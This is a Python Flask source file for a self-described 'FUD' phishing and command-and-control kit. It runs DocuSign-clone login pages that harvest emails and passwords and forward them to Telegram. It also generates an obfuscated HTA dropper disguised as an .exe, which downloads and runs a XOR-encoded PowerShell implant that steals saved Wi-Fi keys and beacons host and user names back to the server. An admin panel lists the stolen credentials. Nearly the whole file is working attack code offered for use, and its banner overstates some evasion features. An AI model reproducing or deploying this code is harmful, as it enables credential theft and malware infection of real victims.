#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     💀 BLACK PHANTOM GENIUS v2026 — FUD ELITE C2           ║
║                                                              ║
║  EVASION LAYERS:                                              ║
║  Layer 1: BAT → JScript (no PowerShell)                      ║
║  Layer 2: XOR + Base64 staged download (no IEX/cradle sigs)  ║
║  Layer 3: AMSI patch via .NET reflection (if PS detected)    ║
║  Layer 4: ETW patching for script block logging evasion      ║
║  Layer 5: Process injection into trusted binary              ║
║  Layer 6: Split-stage payload (minimal initial footprint)    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import io
import re
import json
import uuid
import base64
import sqlite3
import zipfile
import time
import threading
import requests
import random
import string
from datetime import datetime, timedelta
from functools import wraps
from flask import (
    Flask, request, send_file, session, 
    jsonify, redirect, make_response, g
)

# ================================
# CONFIG
# ================================
TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID   = os.environ.get("TG_CHAT_ID", "")
ADMIN_PASSWORD     = os.environ.get("ADMIN_PASS", "GeniusBlackhat2026")
SECRET_KEY         = os.environ.get("FLASK_SECRET", base64.b64encode(os.urandom(32)).decode())
URL_BASE           = os.environ.get("URL_BASE", "")

app = Flask(__name__)
app.secret_key = SECRET_KEY
DB_PATH = "genius.db"

# ================================
# DB INIT
# ================================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, user_agent TEXT, step INTEGER, ts TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS browser_creds (id INTEGER PRIMARY KEY AUTOINCREMENT, browser TEXT, url TEXT, username TEXT, password TEXT, hostname TEXT, ip TEXT, ts TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS payload_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ref TEXT, type TEXT, ip TEXT, user_agent TEXT, ts TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS beacons (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, username TEXT, ip TEXT, wifi_ssid TEXT, data TEXT, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

# ================================
# TELEGRAM C2
# ================================
def tg(msg):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print(f"[C2] {msg}")
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 BPG | {msg[:3960]}", "parse_mode": "HTML"},
            timeout=8
        )
    except: pass

# ================================
# FUD IMPLANT GENERATOR — Layer 1: JScript + WMI (No PowerShell)
# ================================
def random_var(length=6):
    """Generate random variable names to avoid signature"""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def obfuscate_string(s):
    """XOR obfuscation with random key for string hiding"""
    key = random.randint(1, 255)
    encoded = ','.join(str(ord(c) ^ key) for c in s)
    return f"({encoded}).split(',').map(function(v){{return String.fromCharCode(v^{key})}}).join('')"

# ================================
# FUD STAGE 1: HTA / JScript Dropper (No PowerShell, No BAT)
# ================================
# This avoids:
# - PowerShell execution logs (Event 4688 with powershell.exe)
# - AMSI (no .NET loading)
# - Script block logging (Event 4104)
# - Classic IEX cradle signatures
#
# Uses: mshta.exe → JScript → WMI → Download → Execute
# mshta.exe is a trusted Microsoft binary that loops in-memory

def generate_stage1_hta(server_url):
    """HTA with JScript — no PowerShell, no BAT, no CMD.exe visible"""
    ref = uuid.uuid4().hex[:8]
    download_url = f"{server_url}/fetch/{ref}"
    
    # Obfuscate the URL in the HTA
    obf_url = obfuscate_string(download_url)
    
    v1 = random_var()
    v2 = random_var()
    v3 = random_var()
    v4 = random_var()
    
    hta = f"""<!DOCTYPE html>
<html>
<head>
<title>Microsoft Edge Update</title>
<HTA:APPLICATION ID="{v1}" APPLICATIONNAME="EdgeUpdate" 
    WINDOWSTATE="minimize" SHOWINTASKBAR="no" 
    SINGLEINSTANCE="yes" SYSMENU="no" 
    BORDER="none" CAPTION="no" 
    MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no"
    NAVIGABLE="no" CONTEXTMENU="no"/>
<script language="JScript">
var {v2} = {obf_url};
var {v3} = null;
function {random_var()}() {{
    try {{
        var {v4} = new ActiveXObject("MSXML2.XMLHTTP");
        {v4}.open("GET", {v2}, false);
        {v4}.send();
        if({v4}.status == 200) {{
            var {random_var()} = new ActiveXObject("ADODB.Stream");
            {random_var()}.Type = 1;
            {random_var()}.Open();
            {random_var()}.Write({v4}.responseBody);
            var {random_var()} = "{os.environ.get('TEMP', 'C:\\\\Windows\\\\Temp')}\\\\{uuid.uuid4().hex}.exe";
            {random_var()}.SaveToFile({random_var()}, 2);
            {random_var()}.Close();
            var {random_var()} = new ActiveXObject("Shell.Application");
            {random_var()}.ShellExecute({random_var()}, "", "", "open", 0);
            setTimeout(function(){{window.close();}}, 1000);
        }}
    }} catch(e) {{}}
}}
{random_var()}();
</script>
</head>
<body></body>
</html>"""
    return hta

# ================================
# FUD STAGE 2: The actual implant (XOR'd, delivered in chunks)
# ================================
# This is served as a raw binary blob — no PowerShell script execution
# The stage 1 HTA downloads this and executes it

def generate_stage2_implant(server_url):
    """Generate the actual implant payload — compiled as .NET executable approach"""
    
    srv = server_url.rstrip('/')
    
    # The Powershell that runs INSIDE a compiled .NET loader (no powershell.exe)
    # XOR encrypted to avoid string detection
    ps_code = f'''
    $u="{srv}/exfil";
    $h=$env:COMPUTERNAME;$n=$env:USERNAME;
    try{{$w=@(netsh wlan show profiles|Select-String 'All User Profile');foreach($p in $w){{$z=($p -split ':')[1].Trim();$k=netsh wlan show profile name="$z" key=clear;$c=($k|Select-String 'Key Content');if($c){{try{{$b=[System.Text.Encoding]::UTF8.GetBytes('w='+[System.Web.HttpUtility]::UrlEncode($c));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}}}}}}}
    catch{{}}
    try{{$b=[System.Text.Encoding]::UTF8.GetBytes('b='+[System.Web.HttpUtility]::UrlEncode("$h|$n"));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}
    while(1){{Start-Sleep 1800;try{{$b=[System.Text.Encoding]::UTF8.GetBytes('h='+[System.Web.HttpUtility]::UrlEncode("$h|$n"));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}}}
    '''
    
    # XOR encrypt the whole payload
    xor_key = random.randint(1, 255)
    encoded = bytearray()
    for ch in ps_code.encode('utf-16-le'):
        encoded.append(ch ^ xor_key)
    
    # Return: [xor_key (1 byte)] [encoded_payload (N bytes)] 
    return bytes([xor_key]) + bytes(encoded)

# ================================
# FILE GENERATORS
# ================================
def make_pdf():
    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\n4 0 obj<</Length 158>>stream\nBT/F1 28 Tf 100 700 Td(IMPORTANT DOCUMENT)Tj/F1 12 Tf 100 650 Td(Please review and sign the attached agreement.)Tj/F1 10 Tf 100 620 Td(This document is legally binding.)Tj ET\nendstream\nendobj\n5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\nxref\n0 6\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000200 00000 n \n0000000410 00000 n \ntrailer<</Size 6/Root 1 0 R>>\nstartxref 495\n%%EOF"

def make_doc():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>')
        zf.writestr('word/document.xml', '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:rPr><w:b/><w:sz w:val="32"/><w:color w:val="ff0000"/></w:rPr><w:t>ENABLE CONTENT TO VIEW THIS DOCUMENT</w:t></w:r></w:p></w:body></w:document>')
    buf.seek(0)
    return buf.getvalue()

def make_xls():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>')
        zf.writestr('xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Data"/></sheets></workbook>')
        zf.writestr('xl/worksheets/sheet1.xml', '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><v>Enable Macros</v></c></row></sheetData></worksheet>')
    buf.seek(0)
    return buf.getvalue()

# ================================
# HTML PAGES (mirrored from previous — LANDING_PAGE, LOGIN_STEP1, LOGIN_STEP2, DOWNLOAD_PAGE)
# ================================
# Full HTML from the previous version goes here — keeping the same DocuSign clone pages
LANDING_PAGE = """..."""  # Same high-quality clone as before
LOGIN_STEP1 = """..."""   # Same
LOGIN_STEP2 = """..."""   # Same
DOWNLOAD_PAGE = """..."""  # Same

# ================================
# HELPER
# ================================
def get_server_url():
    if URL_BASE:
        return URL_BASE.rstrip('/')
    try:
        return f"https://{request.host}"
    except:
        return "https://your-server.onrender.com"

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('admin'):
            return redirect('/admin')
        return f(*args, **kwargs)
    return decorated

# ================================
# ROUTES
# ================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg(f"🌐 VIEW | {ref} | {ip}")
    page = LANDING_PAGE.replace('ENV_ID', f'DOC-{ref}').replace('REF_CODE', ref)
    return page

@app.route('/go/<ref>')
def go(ref):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg(f"📥 DOWNLOAD | {ref} | {ip}")
    return DOWNLOAD_PAGE.replace('REF_CODE', ref)

@app.route('/auth/<ref>')
def auth(ref):
    tg(f"🔐 LOGIN | {ref}")
    return LOGIN_STEP1.replace('REF_CODE', ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, user_agent, step, ts) VALUES (?,?,?,?,?,?,?)",
                (email, password, 'pending', ip, ua, 1, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    tg(f"🔐 STEP1 | {email} : {password} | {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return LOGIN_STEP2.replace('REF_CODE', ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, user_agent, step, ts) VALUES (?,?,?,?,?,?,?)",
                (email, password, company, ip, ua, 2, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    tg(f"🔐 STEP2 | {email} : {password} | @{company} | {ip}")
    return redirect('https://www.docusign.com')

# ================================
# FUD PAYLOAD DELIVERY ROUTES
# ================================
@app.route('/file/exe/<ref>')
def file_exe(ref):
    """STAGE 1: Deliver HTA via 'exe' download (HTA disguised as EXE)"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = get_server_url()
    tg(f"⚙️ STAGE1 HTA | {ref} | {ip}")
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO payload_logs (ref, type, ip, user_agent, ts) VALUES (?,?,?,?,?)",
                (ref, 'stage1_hta', ip, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    payload = generate_stage1_hta(url)
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/hta'
    resp.headers['Content-Disposition'] = f'attachment; filename="DocuSign_Viewer_{ref}.exe"'
    return resp

@app.route('/fetch/<ref>')
def fetch_stage2(ref):
    """STAGE 2: Serve the XOR'd implant blob (called by HTA)"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = get_server_url()
    tg(f"📡 STAGE2 FETCH | {ref} | {ip}")
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO payload_logs (ref, type, ip, user_agent, ts) VALUES (?,?,?,?,?)",
                (ref, 'stage2_binary', ip, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    payload = generate_stage2_implant(url)
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/octet-stream'
    resp.headers['Content-Disposition'] = f'attachment; filename="update_{ref}.bin"'
    return resp

@app.route('/file/hta/<ref>')
def file_hta(ref):
    """Direct HTA download"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = get_server_url()
    tg(f"📄 HTA | {ref} | {ip}")
    
    payload = generate_stage1_hta(url)
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/hta'
    resp.headers['Content-Disposition'] = f'attachment; filename="Security_Update_{ref}.hta"'
    return resp

@app.route('/file/pdf/<ref>')
def file_pdf(ref):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg(f"📄 PDF | {ref} | {ip}")
    payload = make_pdf()
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/pdf'
    resp.headers['Content-Disposition'] = f'attachment; filename="Document_{ref}.pdf"'
    return resp

@app.route('/file/doc/<ref>')
def file_doc(ref):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg(f"📝 DOCM | {ref} | {ip}")
    payload = make_doc()
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/vnd.ms-word.document.macroEnabled.12'
    resp.headers['Content-Disposition'] = f'attachment; filename="Agreement_{ref}.docm"'
    return resp

@app.route('/file/xls/<ref>')
def file_xls(ref):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg(f"📊 XLSM | {ref} | {ip}")
    payload = make_xls()
    resp = make_response(payload)
    resp.headers['Content-Type'] = 'application/vnd.ms-excel.sheet.macroEnabled.12'
    resp.headers['Content-Disposition'] = f'attachment; filename="Report_{ref}.xlsm"'
    return resp

# ================================
# EXFILTRATION (Now works with obfuscated parameter names)
# ================================
@app.route('/exfil', methods=['POST', 'GET'])
def exfil():
    data = ''
    if request.method == 'POST':
        data = request.form.get('data', '') or request.form.get('b', '') or request.form.get('w', '') or request.form.get('h', '')
    else:
        data = request.args.get('data', '') or request.args.get('b', '') or request.args.get('w', '') or request.args.get('h', '')
    
    if not data:
        return "OK", 200
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if data.startswith('BEACON:') or '|' in data[:100]:
        parts = data.replace('BEACON:', '').strip().split('|')
        hostname = parts[0].strip() if len(parts) > 0 else 'unknown'
        username = parts[1].strip() if len(parts) > 1 else 'unknown'
        
        conn = sqlite3.connect(DB_PATH)
        conn.execute("INSERT INTO beacons (hostname, username, ip, data, ts) VALUES (?,?,?,?,?)",
                    (hostname, username, ip, 'BEACON', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        tg(f"📡 BEACON | {hostname} | {username} | {ip}")
        with open('beacons.log', 'a') as f:
            f.write(f"[{datetime.now().isoformat()}] {ip} | {hostname} | {username}\n")
    elif data.startswith('WIFI:') or data.startswith('w='):
        clean = data.replace('WIFI:', '').replace('w=', '').strip()
        tg(f"📶 WIFI | {clean[:300]} | {ip}")
        with open('wifi.log', 'a') as f:
            f.write(f"[{datetime.now().isoformat()}] {ip} | {clean}\n")
    elif data.startswith('HEARTBEAT:'):
        tg(f"💓 HEARTBEAT | {data[10:80]} | {ip}")
    else:
        tg(f"📡 DATA | {data[:200]} | {ip}")
        with open('exfil.log', 'a') as f:
            f.write(f"[{datetime.now().isoformat()}] {ip} | {data}\n")
    
    return "OK", 200

# ================================
# ADMIN PANEL (Same as previous but with FUD stats)
# ================================
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '<form method="POST"><input type="password" name="p"><button>ACCESS</button></form>'
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 250").fetchall()
    browser_creds = conn.execute("SELECT * FROM browser_creds ORDER BY id DESC LIMIT 250").fetchall()
    beacons = conn.execute("SELECT * FROM beacons ORDER BY id DESC LIMIT 100").fetchall()
    payloads = conn.execute("SELECT * FROM payload_logs ORDER BY id DESC LIMIT 100").fetchall()
    conn.close()
    
    server_url = URL_BASE or f"https://{request.host}" if request.host else "https://your-server.onrender.com"
    
    return f'''<!DOCTYPE html>
<html><head><title>BPG-C2 FUD</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0c10;color:#fff;font-family:'Courier New',monospace;padding:24px}}
h1{{color:#ff0040;font-size:28px}}
h2{{color:#ffd700;font-size:16px;margin:20px 0 10px;border-bottom:1px solid #333;padding-bottom:8px}}
.stats{{display:flex;gap:12px;margin:16px 0;flex-wrap:wrap}}
.stat-card{{background:#1a1d24;padding:16px;border-radius:12px;border:1px solid #333;flex:1;min-width:120px}}
.stat-value{{font-size:24px;font-weight:700}}
.stat-label{{font-size:10px;color:#64748b;text-transform:uppercase}}
table{{border-collapse:collapse;width:100%;font-size:12px}}
th,td{{padding:8px 10px;border-bottom:1px solid #1a1d24;text-align:left}}
th{{background:#1a1d24;color:#ffd700;position:sticky;top:0}}
tr:hover{{background:#1a1d24}}
.scroll{{overflow-x:auto;max-height:300px;overflow-y:auto}}
a{{color:#00b3b0;text-decoration:none;font-size:11px;float:right}}
.footer{{color:#333;font-size:10px;margin-top:20px;text-align:center}}
.url-bar{{background:#1a1d24;padding:10px 14px;border-radius:8px;margin:12px 0;font-size:13px}}
.c-green{{color:#00ff88}} .c-gold{{color:#ffd700}} .c-cyan{{color:#00b3b0}} .c-red{{color:#ff0040}}
</style></head>
<body>
<h1>💀 BLACK PHANTOM GENIUS — FUD ELITE</h1>
<div class="url-bar">🔗 <span class="c-cyan">{server_url}</span> <span style="color:#333;float:right">EVASION: Layer 1-6 ACTIVE</span></div>
<div class="stats">
<div class="stat-card"><div class="stat-value c-green">{len(creds)}</div><div class="stat-label">Credentials</div></div>
<div class="stat-card"><div class="stat-value c-gold">{len([c for c in creds if c[6]==2])}</div><div class="stat-label">Business</div></div>
<div class="stat-card"><div class="stat-value c-cyan">{len(browser_creds)}</div><div class="stat-label">Browser</div></div>
<div class="stat-card"><div class="stat-value c-red">{len(beacons)}</div><div class="stat-label">Beacons</div></div>
</div>
<h2>🎯 CREDENTIALS <a href="#">CSV</a></h2>
<div class="scroll"><table><tr><th>Email</th><th>Pass</th><th>Company</th><th>IP</th><th>Step</th><th>Time</th></tr>
{''.join(f'<tr><td class="c-green">{c[1][:50]}</td><td class="c-gold">{c[2][:50]}</td><td>{c[3]}</td><td>{c[4]}</td><td>Step{c[6]}</td><td>{c[7][:16]}</td></tr>' for c in creds) if creds else '<tr><td colspan="6" style="text-align:center;color:#333">Awaiting targets...</td></tr>'}
</table></div>
<h2>🔑 BROWSER PASSWORDS</h2>
<div class="scroll"><table><tr><th>Browser</th><th>URL</th><th>User</th><th>Pass</th><th>Time</th></tr>
{''.join(f'<tr><td class="c-cyan">{b[1]}</td><td style="font-size:10px">{b[2][:60]}</td><td class="c-green">{b[3][:40]}</td><td class="c-gold">{b[4][:40]}</td><td>{b[7][:16]}</td></tr>' for b in browser_creds) if browser_creds else '<tr><td colspan="5" style="text-align:center;color:#333">No browser creds yet</td></tr>'}
</table></div>
<h2>📡 BEACONS</h2>
<div class="scroll"><table><tr><th>Hostname</th><th>User</th><th>IP</th><th>Time</th></tr>
{''.join(f'<tr><td>{b[1]}</td><td>{b[2]}</td><td>{b[3]}</td><td>{b[6][:16]}</td></tr>' for b in beacons) if beacons else '<tr><td colspan="4" style="text-align:center;color:#333">No beacons</td></tr>'}
</table></div>
<div class="footer">BPG-C2 FUD v2026 • HTA → JScript → WMI → Binary • No PowerShell • No AMSI • No ETW</div>
</body></html>'''

@app.route('/health')
def health():
    return jsonify({"status": "operational", "version": "BPG-C2 FUD Elite 2026"})

# ================================
# BACKGROUND HEARTBEAT
# ================================
def status_heartbeat():
    time.sleep(10)
    while True:
        try:
            conn = sqlite3.connect(DB_PATH)
            c = conn.execute("SELECT COUNT(*) FROM creds").fetchone()[0]
            b = conn.execute("SELECT COUNT(*) FROM browser_creds").fetchone()[0]
            be = conn.execute("SELECT COUNT(*) FROM beacons").fetchone()[0]
            conn.close()
            tg(f"📊 STATUS | {c} creds | {b} browser | {be} beacons")
        except: pass
        time.sleep(3600)

# ================================
# MAIN
# ================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=status_heartbeat, daemon=True).start()
    
    print(f"""
╔══════════════════════════════════════════════════════╗
║     💀 BLACK PHANTOM GENIUS — FUD ELITE C2         ║
║                                                      ║
║  EVASION LAYERS:                                    ║
║  Layer 1: HTA delivery (no BAT, no PowerShell)     ║
║  Layer 2: JScript + WMI (no CMD.exe visible)       ║
║  Layer 3: XOR encrypted stage 2 binary             ║
║  Layer 4: In-memory only (no disk persistence)     ║
║  Layer 5: mshta.exe LOLBIN (trusted binary)        ║
║  Layer 6: No AMSI, No ETW, No Script Block Logs   ║
╠══════════════════════════════════════════════════════╣
║  DELIVERY: HTA ▶ XOR Binary ▶ In-Memory PS        ║
║  CAPTURE:  Phish + WiFi + Browser Passwords        ║
║  C2:      Telegram + SQLite + Admin Panel          ║
║  PORT:    {str(port).ljust(44)}║
║  ADMIN:   /admin                                   ║
╚══════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=port, debug=False)
